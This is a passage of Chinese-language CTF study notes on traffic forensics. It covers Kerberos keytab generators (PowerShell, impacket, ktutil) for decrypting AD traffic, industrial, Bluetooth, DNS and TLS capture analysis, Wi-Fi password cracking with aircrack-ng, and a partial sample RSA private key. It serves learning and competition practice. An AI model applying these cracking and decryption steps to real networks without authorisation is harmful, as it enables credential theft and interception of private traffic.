    $AESKey = $null
    
    $Aes = New-Object System.Security.Cryptography.AesManaged
    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $Aes.BlockSize = 128

    $encryptor = $Aes.CreateEncryptor($key,$IV)
    $memStream = new-Object IO.MemoryStream

    [byte[]] $AESKey = @()
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $cryptoStream.Write($Data, 0, $Data.Length)
    $CryptoStream.FlushFinalBlock()
    $cryptoStream.Close()

    $AESKey = $memStream.ToArray()
    $memStream.Close()
    $Aes.Dispose()

    return $AESKey
}

function Get-AES128Key {
param (
[Parameter(Mandatory=$true)]$PasswordString,
[Parameter(Mandatory=$true)]$SALT=""
)

[byte[]] $PBKDF2 = Get-PBKDF2 -PasswordString $passwordString -SALT $SALT -KeySize 16
#[byte[]] $nFolded = (Get-NFold-Bytes -Data ([Text.Encoding]::ASCII.GetBytes("kerberos")) -KeySize 16)
[byte[]] $nFolded = @(107,101,114,98,101,114,111,115,123,155,91,43,147,19,43,147)
[byte[]] $Key = $PBKDF2
[byte[]] $IV =  @(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)

$AES128Key = Encrypt-AES -KeyData $key -IVData $IV -Data $nFolded
return $(Get-HexStringFromByteArray -Data $AES128Key)
}

function Get-AES256Key {
param (
[Parameter(Mandatory=$true)]$PasswordString,
[Parameter(Mandatory=$true)]$SALT=""
)

[byte[]] $PBKDF2 = Get-PBKDF2 -PasswordString $passwordString -SALT $SALT -KeySize 32
#[byte[]] $nFolded = (Get-NFold-Bytes -Data ([Text.Encoding]::ASCII.GetBytes("kerberos")) -KeySize 16)
[byte[]] $nFolded = @(107,101,114,98,101,114,111,115,123,155,91,43,147,19,43,147)
[byte[]] $Key = $PBKDF2
[byte[]] $IV =  @(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)

$k1 = Encrypt-AES -KeyData $key -IVData $IV -Data $nFolded
$k2 = Encrypt-AES -KeyData $key -IVData $IV -Data $k1

$AES256Key = $k1 + $k2
return $(Get-HexStringFromByteArray -Data $AES256Key)
}

function Get-HexStringFromByteArray{
param (
[Parameter(Mandatory=$true,Position=0)][byte[]]$Data
)
$hexString = $null

        $sb = New-Object System.Text.StringBuilder ($Data.Length * 2)
        foreach($b in $Data)
        {
            $sb.AppendFormat("{0:x2}", $b) |Out-Null
        }
        $hexString = $sb.ToString().ToUpper([CultureInfo]::InvariantCulture)

return $hexString
}

function Get-ByteArrayFromHexString{
param 
(
[Parameter(Mandatory=$true)][String]$HexString
)
        $i = 0;
        $bytes = @()
        while($i -lt $HexString.Length)
        {
            $chars = $HexString.SubString($i, 2)
            $b = [Convert]::ToByte($chars, 16)
            $bytes += $b
            $i = $i+2
        }
return $bytes
}

function Get-BytesBigEndian {
param (
[Parameter(Mandatory=$true)]$Value,
[Parameter(Mandatory=$true)][ValidateSet("16", "32")][String[]]$BitSize
)

### Set Key Type
[byte[]] $bytes = @()
switch($BitSize){
"16"{
    $bytes = [BitCOnverter]::GetBytes([int16]$Value)
    if([BitCOnverter]::IsLittleEndian){
    [Array]::Reverse($bytes)
    }
    break;
    }
"32"{
    $bytes = [BitCOnverter]::GetBytes([int32]$Value)
    if([BitCOnverter]::IsLittleEndian){
    [Array]::Reverse($bytes)
    }
    break;
     }
default{}
}

return $bytes
}

function Get-PrincipalType {
param (
[Parameter(Mandatory=$true)][ValidateSet("KRB5_NT_PRINCIPAL", "KRB5_NT_SRV_INST", "KRB5_NT_SRV_HST", "KRB5_NT_UID")][String[]]$PrincipalType
)

[byte[]] $nameType = @()

switch($PrincipalType){
"KRB5_NT_PRINCIPAL"{$nameType = @(00,00,00,01);break}
"KRB5_NT_SRV_INST"{$nameType = @(00,00,00,02);break}
"KRB5_NT_SRV_HST"{$nameType = @(00,00,00,03);break}
"KRB5_NT_UID"{$nameType = @(00,00,00,05);break}
default{$nameType = @(00,00,00,01);break}
}

return $nameType
}

function Create-KeyTabEntry {
param (
[Parameter(Mandatory=$true)]$PasswordString,
[Parameter(Mandatory=$true)]$RealmString,
[Parameter(Mandatory=$true)]$Components,
[Parameter(Mandatory=$false)]$SALT="",
[Parameter(Mandatory=$false)]$KVNO=1,
[Parameter(Mandatory=$true)][ValidateSet("KRB5_NT_PRINCIPAL", "KRB5_NT_SRV_INST", "KRB5_NT_SRV_HST", "KRB5_NT_UID")][String[]]$PrincipalType,
[Parameter(Mandatory=$true)][ValidateSet("RC4", "AES128", "AES256")][String[]]$EncryptionKeyType
)

### Key Types: RC4 0x17 (23), AES128  0x11 (17), AES256  0x12 (18)

### Set Key Type
[byte[]] $keyType = @()
[byte[]] $sizeKeyBlock = @()

switch($EncryptionKeyType){
"RC4"{
       $keyType = @(00,23)
       $sizeKey = 16
       $sizeKeyBlock = @(00,16)
       ### Create RC4-HMAC Key. Unicode is required for MD4 hash input.
       [byte[]]$password = [Text.Encoding]::Unicode.GetBytes($passwordString)
       $keyBlock = Get-MD4 -bArray $password -UpperCase
       break
       }
"AES128"{
        $keyType = @(00,17)
        $sizeKey = 16
        $sizeKeyBlock = @(00,16)
        #$keyBlock = Get-AES128Key -PasswordString $passwordString -Realm $RealmString -Principal $PrincipalString -SALT $SALT
        $keyBlock = Get-AES128Key -PasswordString $passwordString -SALT $SALT
        break
        }
"AES256"{
        $keyType = @(00,18)
        $sizeKey = 32
        $sizeKeyBlock = @(00,32)
        #$keyBlock = Get-AES256Key -PasswordString $passwordString -Realm $RealmString -Principal $PrincipalString -SALT $SALT
        $keyBlock = Get-AES256Key -PasswordString $passwordString -SALT $SALT
        break
        }
default{}
}

### Set Principal Type
[byte[]] $nameType = @()
switch($PrincipalType){
"KRB5_NT_PRINCIPAL"{$nameType = @(00,00,00,01);break}
"KRB5_NT_SRV_INST"{$nameType = @(00,00,00,02);break}
"KRB5_NT_SRV_HST"{$nameType = @(00,00,00,03);break}
"KRB5_NT_UID"{$nameType = @(00,00,00,05);break}
default{$nameType = @(00,00,00,01);break}
}

### KVNO larger than 255 requires 32bit KVNO field at the end of the record
$vno = @()

if($kvno -le 255){
$vno = @([byte]$kvno)
} else {
$vno = @(00)
}

[byte[]]$numComponents = Get-BytesBigEndian -BitSize 16 -Value $components.Count

### To Set TimeStamp To Jan 1, 1970 - [byte[]]$timeStamp = @(0,0,0,0)
### [byte[]]$timeStamp = Get-BytesBigEndian -BitSize 32 -Value ([int]([Math]::Truncate((Get-Date(Get-Date).ToUniversalTime() -UFormat %s))))
### 15 September 2020 Updated
### https://github.com/matherm-aboehm suggested use of [decimal]::Parse to fix timestamp error on localized versions of Windows.
[byte[]]$timeStamp = Get-BytesBigEndian -BitSize 32 -Value ([int]([Math]::Truncate([decimal]::Parse((Get-Date(Get-Date).ToUniversalTime() -UFormat %s)))))

### Data size information for KeyEntry
# num_components bytes   = 2
# realm bytes            = variable (2 bytes) + length
# components array bytes = varable (2 bytes) + length for each component. Component count should be typically 1 or 2.
# name type bytes        = 4
# timestamp bytes        = 4
# kvno bytes             = 1 or 4
# Key Type bytes         = 2
# Key bytes              = 2 + 16 or 32 "RC4 and AES128 are 16 Byte Keys. AES 256 is 32"

$sizeRealm  = Get-BytesBigEndian -Value ([Text.Encoding]::UTF8.GetByteCount($realmString)) -BitSize 16
[Int32]$sizeKeyTabEntry = 2 #NumComponentsSize
$sizeKeyTabEntry += 2 #RealmLength Byte Count 
$sizeKeyTabEntry += ([Text.Encoding]::UTF8.GetByteCount($realmString))
    foreach($principal in $Components){
    $sizePrincipal = ([Text.Encoding]::UTF8.GetByteCount($principal))
    $sizeKeyTabEntry += $sizePrincipal + 2
    }
$sizeKeyTabEntry += 4 #NameType
$sizeKeyTabEntry += 4 #TimeStamp
$sizeKeyTabEntry += 1 #KVNO 8bit
$sizeKeyTabEntry += 2 #KeyType
$sizeKeyTabEntry += 2 #Key Length Count
$sizeKeyTabEntry += $sizeKey

$sizeTotal = Get-BytesBigEndian -Value $sizeKeyTabEntry -BitSize 32

[byte[]] $keytabEntry = @()
$keytabEntry += $sizeTotal
$keytabEntry += $numComponents
$keytabEntry += $sizeRealm
$keytabEntry += [byte[]][Text.Encoding]::UTF8.GetBytes($realmString)
    foreach($principal in $Components){
    $sizePrincipal = Get-BytesBigEndian -Value ([Text.Encoding]::UTF8.GetByteCount($principal)) -BitSize 16
    $keytabEntry += $sizePrincipal
    $keytabEntry += [byte[]][Text.Encoding]::UTF8.GetBytes($principal)
    }
$keytabEntry += $nameType
$keytabEntry += $timeStamp
$keytabEntry += $vno
$keytabEntry += $keyType
$keytabEntry += $sizeKeyBlock
$keytabEntry += Get-ByteArrayFromHexString -HexString $keyBlock

$keytabEntryObject = [PsCustomObject]@{
        Size           = $sizeKeyTabEntry
        NumComponents  = $numComponents
        Realm          = [byte[]][Text.Encoding]::UTF8.GetBytes($realmString)
        Components     = $components
        NameType       = $nameType
        TimeStamp      = $timeStamp
        KeyType        = $keyType
        KeyBlock       = $keyBlock
        KeytabEntry    = $keytabEntry
    }
return $keytabEntryObject
}

Function Get-Password {

        $passwordSecure = Read-Host -Prompt "Enter Password" -AsSecureString
        $passwordBSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($passwordSecure)
        $password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($passwordBSTR)


return $password
}


if ([string]::IsNullOrEmpty($Password)){$Password = $(Get-Password)}

if ([string]::IsNullOrEmpty($File)){$File=$(Get-Location).Path+'\login.keytab'}

if($Quiet) {
$Script:Silent = $true
} else {
$Script:Silent = $false
}

### Force Realm to UPPERCASE
$Realm = $Realm.ToUpper()

### The Components array splits the primary/principal.
$PrincipalArray = @()
$PrincipalArray = $Principal.Split(',')
### Check For Custom SALT
if([string]::IsNullOrEmpty($SALT) -eq $true) {
$SALT = $Realm
for($i=0;$i -lt $PrincipalArray.Count;$i++){
$SALT += $($PrincipalArray[$i].Replace('/',""))
}

}
### Finish spliting principal into component parts. PrincipalArray should have at most 2 elements. Testing with Java based tools, 
### the keytab entry can only support one UPN. The components portion of the keytab entry appears to only be for spliting
### a UPN in an SPN format. e.g. HOST/user@dev.home
$PrincipalText = $Principal
$Principal = $Principal.Replace('/',",")
$PrincipalArray = @()
$PrincipalArray = $Principal.Split(',')

[byte[]] $keyTabVersion = @(05,02)
[byte[]] $keyTabEntries = @()

### Set Default Encryption to AES256 if none of the E-Type switches are set
if(!$RC4 -and !$AES128 -and !$AES256){
$AES256 = $true
}

### Truncate KVNO
[Byte[]] $KVNO = [Byte[]](Get-BytesBigEndian -BitSize 32 -Value $KVNO)
[int16] $KVNO = [int]$KVNO[3]

### Create KeyTab Entries for selected E-Types RC4/AES128/AES256 supported
$keytabEntry = $null
if($RC4 -eq $true){
$keytabEntry = Create-KeyTabEntry `
-realmString $Realm -Components $PrincipalArray -passwordString $Password `
-PrincipalType $PType -EncryptionKeyType RC4 -KVNO $KVNO
$keyTabEntries += $keytabEntry.KeytabEntry
if($Script:Silent -eq $false){ Write-Host "RC4:"$keytabEntry.KeyBlock -ForegroundColor Cyan}
}
$keytabEntry = $null
if($AES128 -eq $true){
$keytabEntry = Create-KeyTabEntry `
-realmString $Realm -Components $PrincipalArray -passwordString $Password `
-PrincipalType $PType -EncryptionKeyType AES128 -KVNO $KVNO -SALT $SALT
$keyTabEntries += $keytabEntry.KeytabEntry
if($Script:Silent -eq $false){ Write-Host "AES128:"$keytabEntry.KeyBlock -ForegroundColor Cyan}
}
$keytabEntry = $null
if($AES256 -eq $true){
$keytabEntry = Create-KeyTabEntry `
-realmString $Realm -Components $PrincipalArray -passwordString $Password `
-PrincipalType $PType -EncryptionKeyType AES256 -KVNO $KVNO -SALT $SALT
$keyTabEntries += $keytabEntry.KeytabEntry
if($Script:Silent -eq $false){ Write-Host "AES256:"$keytabEntry.KeyBlock -ForegroundColor Cyan}
}

if($Script:Silent -eq $false){
Write-Host $("Principal Type:").PadLeft(15)$PType -ForegroundColor Green
Write-Host $("Realm:").PadLeft(15)$Realm -ForegroundColor Green
Write-Host $("User Name:").PadLeft(15)$PrincipalText -ForegroundColor Green
Write-Host $("SALT:").PadLeft(15)$SALT -ForegroundColor Green
Write-Host $("Keytab File:").PadLeft(15)$File -ForegroundColor Green
Write-Host $("Append File:").PadLeft(15)$Append -ForegroundColor Green
Write-Host ""
}

if(!$NoPrompt){
Write-Host "Press Enter to Write KeyTab File /Ctrl+C to quit..." -ForegroundColor Yellow -NoNewline
[void](Read-Host)
Write-Host ""
}

if($Append -eq $true){
$fileBytes = @()
    if([System.IO.File]::Exists($File)){
    $fileBytes += [System.IO.File]::ReadAllBytes($File) + $keyTabEntries
    [System.IO.File]::WriteAllBytes($File,$fileBytes)
    } else {
    $fileBytes = @()
    $fileBytes += $keyTabVersion
    $fileBytes += $keyTabEntries
    [System.IO.File]::WriteAllBytes($File,$fileBytes)
    }
} else {
$fileBytes = @()
$fileBytes += $keyTabVersion
$fileBytes += $keyTabEntries
[System.IO.File]::WriteAllBytes($File,$fileBytes)
}
```

方法二：基于impacket生成 keytab

参考文章：

1. https://medium.com/tenable-techblog/decrypt-encrypted-stub-data-in-wireshark-deb132c076e7

2. https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/#debugging-kerberos-the-easy-way


```python
from struct import unpack, pack
from impacket.structure import Structure
import binascii
import sys

# Keytab structure from http://www.ioplex.com/utilities/keytab.txt
  # keytab {
  #     uint16_t file_format_version;                    /* 0x502 */
  #     keytab_entry entries[*];
  # };

  # keytab_entry {
  #     int32_t size;
  #     uint16_t num_components;    /* sub 1 if version 0x501 */
  #     counted_octet_string realm;
  #     counted_octet_string components[num_components];
  #     uint32_t name_type;   /* not present if version 0x501 */
  #     uint32_t timestamp;
  #     uint8_t vno8;
  #     keyblock key;
  #     uint32_t vno; /* only present if >= 4 bytes left in entry */
  # };

  # counted_octet_string {
  #     uint16_t length;
  #     uint8_t data[length];
  # };

  # keyblock {
  #     uint16_t type;
  #     counted_octet_string;
  # };

class KeyTab(Structure):
    structure = (
        ('file_format_version','H=517'),
        ('keytab_entry', ':')
    )
    def fromString(self, data):
        self.entries = []
        Structure.fromString(self, data)
        data = self['keytab_entry']
        while len(data) != 0:
            ktentry = KeyTabEntry(data)

            data = data[len(ktentry.getData()):]
            self.entries.append(ktentry)

    def getData(self):
        self['keytab_entry'] = b''.join([entry.getData() for entry in self.entries])
        data = Structure.getData(self)
        return data

class OctetString(Structure):
    structure = (
        ('len', '>H-value'),
        ('value', ':')
    )

class KeyTabContentRest(Structure):
    structure = (
        ('name_type', '>I=1'),
        ('timestamp', '>I=0'),
        ('vno8', 'B=2'),
        ('keytype', '>H'),
        ('keylen', '>H-key'),
        ('key', ':')
    )

class KeyTabContent(Structure):
    structure = (
        ('num_components', '>h'),
        ('realmlen', '>h-realm'),
        ('realm', ':'),
        ('components', ':'),
        ('restdata',':')
    )
    def fromString(self, data):
        self.components = []
        Structure.fromString(self, data)
        data = self['components']
        for i in range(self['num_components']):
            ktentry = OctetString(data)

            data = data[ktentry['len']+2:]
            self.components.append(ktentry)
        self.restfields = KeyTabContentRest(data)

    def getData(self):
        self['num_components'] = len(self.components)
        # We modify the data field to be able to use the
        # parent class parsing
        self['components'] = b''.join([component.getData() for component in self.components])
        self['restdata'] = self.restfields.getData()
        data = Structure.getData(self)
        return data

class KeyTabEntry(Structure):
    structure = (
        ('size','>I-content'),
        ('content',':', KeyTabContent)
    )

# Add your own keys here!
# Keys are tuples in the form (keytype, 'hexencodedkey')
# Common keytypes for Windows:
# 23: RC4
# 18: AES-256
# 17: AES-128
# Wireshark takes any number of keys in the keytab, so feel free to add
# krbtgt keys, service keys, trust keys etc
keys = [
    (23, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'),
    (18, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'),
    (17, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'),
    (18, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'),
    (23, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
]

nkt = KeyTab()
nkt.entries = []

for key in keys:
    ktcr = KeyTabContentRest()
    ktcr['keytype'] = key[0]
    ktcr['key'] = binascii.unhexlify(key[1])
    nktcontent = KeyTabContent()
    nktcontent.restfields = ktcr
    # The realm here doesn't matter for wireshark but does of course for a real keytab
    nktcontent['realm'] = b'TESTSEGMENT.LOCAL'
    krbtgt = OctetString()
    krbtgt['value'] = 'krbtgt'
    nktcontent.components = [krbtgt]
    nktentry = KeyTabEntry()
    nktentry['content'] = nktcontent
    nkt.entries.append(nktentry)

data = nkt.getData()
if len(sys.argv) < 2:
    print('Usage: keytab.py <outputfile>')
    print('Keys should be written to the source manually')
else:
    with open(sys.argv[1], 'wb') as outfile:
        outfile.write(data)
```

方法三：在 Linux 下使用 ktutil 命令制作 keytab

参考文章：https://tipi-hack.github.io/2023/01/22/insomnihack-teaser-autopsy.html#the-dcerpc-decryption-problem

```bash
$ ktutil
ktutil:  addent -p adm-drp@inscorp.com -k 1 -key -e rc4-hmac
Key for adm-drp@inscorp.com (hex): 5c4dbe6a8a44446f8d2899ff08ea14f2
ktutil:  wkt ins.keytab
ktutil:  q
```

例题1-[2025 华为杯中国研究生网络安全创新大赛实网对抗赛 EZ_ATEXEC](https://goodlunatic.github.io/posts/02298dd/)

例题2-[2024 中央企业网络安全大赛 EZ_AD](https://1cepeak.cn/posts/yqds2024-writeup/#ez_ad)

例题3-[2024 SUCTF SU_AD](https://z3n1th1.com/2025/01/suctf2025-writeup/#su_ad)

## AD域流量分析

### DCE/RPC 协议

按照 NTLM/Kerberos 解密的流程，解密出来后查看即可，就是这里要注意 wireshark 版本要在 4.0.6 以上，要不然会解码不完整

![](imgs/image-20251105145452260.png)

然后可以依次到 TaskSchedulerService 的数据包中把完整的数据复制出来

![](imgs/image-20251105145456622.png)

例题1-[2025 华为杯中国研究生网络安全创新大赛实网对抗赛 EZ_ATEXEC](https://goodlunatic.github.io/posts/02298dd/)

例题2-[2024 中央企业网络安全大赛 EZ_AD](https://1cepeak.cn/posts/yqds2024-writeup/#ez_ad)

例题3-[2024 SUCTF SU_AD](https://z3n1th1.com/2025/01/suctf2025-writeup/#su_ad)

## RTP流量分析

RTP 协议一般用于电话流量当中，可以根据流量中传输数据的特征来判断

![](imgs/image-20251105143329850.png)

我们需要先在启用的协议里勾选RTP-UDP，然后右键Decode As，改成RTP

然后到 电话-RTP-RTP流 中去听电话传输的内容即可，如果传的流比较多，可以用 [rtpbreak](https://github.com/foreni-packages/rtpbreak) 批量提取出来

例题1-BUUOJ VOIP

例题2-2025 SUCTF EZ_VOIP

例题3-2025 强网杯 谍影重重6.0

## 工控流量分析

参考连接：https://blog.csdn.net/song123sh/article/details/128387982

将流量按长度降序排列，然后在各层寻找线索，

显示分组字节，从base64后开始，然后解码看文件类型，最后显示成该类型
### Modbus 协议分析

Modbus 流量主要有三类：Modbus/RTU、Modbus/ASCII、Modbus/TCP

**Modbus/RTU**
>从机地址1B+功能码1B+数据字段xB+CRC值2B
>最大长度256B，所以数据字段最大长度252B

**Modbus/ASCII**
>由Modbus/RTU衍生，采用0123456789ABCDEF 表示原本的从机地址、功能码、数据字段，并添加开始结束标记，所以长度翻倍
开始标记:（0x3A）1B+从机地址2B+功能码2B+数据字段xB+LRC值2B+结束标记\r\n2B
最大长度513B，因为数据字段在RTU中是最大252B，所以在ASCII中最大504B

**Modbus/TCP**
>不再需要从机地址，改用UnitID；不再需要CRC/LRC，因为TCP自带校验
传输标识符2B+协议标识符2B+长度2B+从机ID 1B+功能码1B+数据字段xB

一般题目考察 Modbus/TCP 比较多，然后主要考察的就是下面这种功能码（这里只列了部分）
因此解题的时候配合过滤器一个个功能码看过去就行
>1：读线圈
2：读离散输入
3：读保持
4：读输入
5：写单个线圈
6：写单个保持
15：写多个线圈
16：写多个保持

#### 例题1 HNGK-Modbus流量分析
使用下面这个过滤器命令即可得到 flag
```
(((_ws.col.protocol == "Modbus/TCP") ) && (modbus.byte_cnt)) && (modbus.func_code == 16)
```
![](imgs/image-20240430142133329.png)
flag{TheModbusProtocolIsFunny!}
### S7comm 协议分析

> 西门子设备的工控协议，基于 COTP 实现，是COTP的上层协议
> 
> 主要有三种类型：Job(1)、Ack_Data(3)/Ack(2)、Userdata(7)
> 
> Job：下发任务/指令
> 
> Ack_Data：带有返回数据
> 
> Ack：单纯确认，含有数据
> 
> Userdata：用户自定义数据区，也包含功能指令

#### 例题1 2020ICSC湖州站—工控协议数据分析

首先过滤出S7协议的数据包，发现在一些Ack_Data的数据包中传输了二进制数据
![](imgs/image-20240430111822297.png)
因此，我们将所有带有二进制数据的数据包都过滤出来，发现一些Job的数据包中也有二进制数据
![](imgs/image-20240430112312109.png)
然后我们尝试将所有带有二进制数据的Job数据包都过滤出来并导出特定分组，过滤器代码如下
```bash
((s7comm) && (s7comm.resp.data)) && (s7comm.param.func == 0x05)
```

![](imgs/image-20240430112740044.png)

然后使用 tshark 提取数据
```tshark
tshark -r 1.pcap -T fields -e s7comm.resp.data | uniq
```
![](imgs/image-20240430112936680.png)

最后 CyberChef 解码二进制即可得到 flag
![](imgs/image-20240430113016466.png)
#### 例题2 2020ICSC济南站—被篡改的数据
翻看流量包，发现很多 S7COMM 数据包，使用过滤器过滤，发现 s7comm.resp.data 字段传了很多 66 数据
使用过滤器过滤出传了 s7comm.resp.data 字段数据但数据不是 66 的 S7 数据包
发现了疑似 flag 的数据，为了防止 flag 中含有 f 字符而被过滤
因此我们使用下面这个过滤命令进行过滤，然后导出特定分组
```
(((frame.number >= 19987 && frame.number <=20032) && (_ws.col.protocol == "S7COMM")) && (s7comm.param.func == 0x05)) && (s7comm.resp.data)
```
最后 tshark 提取出数据，然后十六进制解码即可得到 flag：flag{93137ad4a}

#### 例题3 枢网智盾2021—异常流分析
打开流量包，发现很多 S7comm 流量，然后稍微过滤一下，发现是写入数据的流量
然后写入的数据几乎都是 ffff 开头的，因此我们直接查看不是 ffff 开头的数据
```
((_ws.col.protocol == "S7COMM") && (s7comm.param.func == 0x05)) && (s7comm.resp.data[0:2] != ff:ff)
```
即可得到 flag：flag{ffad28a0ce69db34751f}
#### 例题4 枢网智盾2021—工控协议分析
```
(_ws.col.protocol == "S7COMM") && (frame.number == 418)
```
![](imgs/image-20240430135813366.png)
然后直接把明文传输的数据 base64 解码即可
![](imgs/image-20240430135958048.png)

`flag{hncome66!}`

### IEC60870_ASDU协议

> IEC60870_ASDU协议是电力系统中的一种协议

可能会把关键信息藏在 IOA 参数中


### TPKT协议

用以下命令提取下 TPKT 协议中传输的数据

```bash
tshark -r S7Vegenere.pcapng -Y '_ws.col.protocol == "TPKT"' -T fields -e 'data.data'
```

如果上面这个命令提取出来的数据不完整，可以用以下这个命令直接去提取 TCP 中传输的数据

```bash
tshark -r 工业控制协议流量分析2.pcap -T fields -Y '!(tcp.payload == 4d:4d:53:5f:50:41:59:4c:4f:41:44:5f:4e:4f:52:4d:41:4c)' -e tcp.payload > out.txt
```


### DNP 3.0协议

用以下命令提取一下传输的数据

```bash
tshark -r dnp3.pcapng -T fields -e 'dnp3.al.octet_string'
```


## 蓝牙流量分析

### OBEX协议

过滤器中输入`OBEX`，然后导出传输的压缩包，然后再在搜索中输入`PIN Code`选择分组列表和字符串即可找到解压密码

### ATT协议

例题1-low_energy_crypto

```bash
# 先用tshark导出公钥，并把公钥另存为pub.key
tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_rx -Y 'btatt.opcode == 0x1b' | sed '/^\s*$/d' | uniq > data.txt
# 然后用tshark导出密文，这里的数据如果不是十六进制，用tshark提有时候会出问题，可以手提
tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y 'btatt.opcode == 0x12' | sed '/^\s*$/d' | uniq > enc.txt
# 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了，这里的密文后面如果有多余\x00，可以用010手动去除，要不然可能解密失败
python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc.txt
```

![](imgs/image-20241202135717254.png)

例题2-BLE_crypto
```bash
# 先用tshark导出公钥，并把公钥另存为pub.key，这里如果是十六进制，需要CyberChef转换一下先
tshark -r BLE_crypto.pcapng -T fields -e btatt.value -Y 'btatt.opcode' | sed '/^\s*$/d'
# 然后用tshark导出密文，如果是十六进制，需要CyberChef转换一下先
tshark -r low_energy_crypto.pcapng -T fields -e btgatt.nordic.uart_tx -Y 'btatt.opcode == 0x12' | sed '/^\s*$/d' | uniq > enc.txt
# 公钥和密文都有了之后，就可以直接用RsaCtfTool解密密文了
python3 /home/kali/RsaCtfTool/RsaCtfTool.py --publickey ./pub.key --decryptfile ./enc
```

![](imgs/image-20241202140503314.png)

**手动解析RSA公钥，并爆破生成私钥：**

 1. 解析公钥: `openssl rsa -in pub.key -text -inform PEM -pubin`

![](imgs/image-20250226232852559.png)

2. 十六进制转十进制并分解n

![](imgs/image-20250226233215942.png)

3. 使用 rsatool.py 导出私钥 priv.key

```bash
python rsatool.py -p 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026527 -q 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026221 -e 65537
```

![](imgs/image-20250226233503658.png)

4. 使用私钥来解密密文
```bash
openssl rsautl -decrypt -raw -inkey priv.key -in flag
openssl pkeyutl -decrypt -in flag -out decrypted_flag -inkey priv.key
```

### SMP协议

SMP协议的全称是Secure Manager Protocol，用来定义蓝牙的配对和密钥的分发

配对完成后传输的数据是加密的，我们需要用(Crakle)[https://github.com/mikeryan/crackle]这个项目进行解密

> 这里老版本的可能有点问题，建议去pr中找一下新版的安装
> 
> 参考链接：https://cloud.tencent.com/developer/article/2159878

安装好项目后直接运行一下命令解密流量包即可

```bash
crackle -i uploads_2022_04_11_h5kAcZEg_ble.pcapng -o dec.pcapng
```

![](imgs/image-20241202141020218.png)

SMP协议解密完成后，我们可以在ATT协议中发现传输的数据，用以下命令导出

```bash
tshark -r dec.pcapng -T fields -e btatt.value -Y 'btatt.opcode == 0x52' | sed '/^\s*$/d'
```

然后CyberChef将得到的十六进制数据转换一下即可得到flag：`flag{9ba3973652c0ee073652c0ee0c76ca6cb36441bd40}`

## 邮件(STMP)流量分析

可以试试看导出对象-导出IMF-导出文件的后缀是eml（可以使用网易邮箱大师打开）

eml文件是将数据base64编码后再传输的，有些数据直接用邮箱软件打开可能看不到，建议手搓一遍

## 无线流量分析

在kali中用弱口令密码爆破出WIFI密码

执行命令：`aircrack-ng ctf.pcap -w rockyou.txt`

执行命令解码：`airdecap-ng -p password1 ctf.pcap -e ctf -o 1.pcap`

然后打开解码后的文件，查找flag

## DNS流量分析

### DNSlog外带的流量

![](imgs/image-20241120165643159.png)

直接使用tshark导出DNS外带的数据
```bash
tshark -r 1.pcap -T fields -e dns.qry.name -Y ' ip.dst == 8.8.8.8 && dns.qry.type == 1' | sed '/^\s*$/d' | uniq > data.txt
```

例题1-攻防世界 MISC - tunnel

### 数据以二进制藏在DNS各种解析记录中

这种情况下有时候需要分IP导出数据

> DNS记录类型，常用的有：
> 
> A：A记录，指向别名或IPv4地址。
> 
> AAAA：IPv6地址解析。
> 
> NS：解析服务器记录。
> 
> MX：邮件交换记录。
> 
> CNAME：别名。
> 
> txt：为某个主机名或域名设置的说明。
> 
> PTR：指针记录，PTR记录是A记录的逆向记录。
> 
> SOA：标记一个区的开始，起始授权机构记录

例题1-2024国赛-Toug_DNS

### 信息以二进制藏在端口号末尾中


## SLL、TLS加密流量分析

> 老版本的 wireshark 中显示的是 SSL，新版本的改成TLS了

解密方法就是点击 编辑 -> 首选项 -> Protocols -> TLS `加载 RSA 私钥` 或者 `加载日志文件((Pre)-Master-Secret log)`

解完密后就和平常的流量分析一样了

例题1-BUU 第九章TLS流量分析

打开流量包发现有 TLS 数据包，然后还有一些红黑条纹，猜测是被加密了

翻看流量包，追踪 TCP 流，发现流7中POST了一个 sslkey.log 日志文件

![](imgs/N7.png)

导出 sslkey.log 日志文件，然后按上面的步骤导入解密

![](imgs/N8.png)

解密完后直接搜索 flag{ 字符串即可找到 flag{e3364403651e775bfb9b3ffa06b69994}

![](imgs/N9.png)

例题-DDCTF2018 流量分析

直接在 TLS 加载 RSA 私钥解密即可

私钥的格式如下：

```
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ
LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO
vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB
AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4
QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/
QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN
czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ
ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9
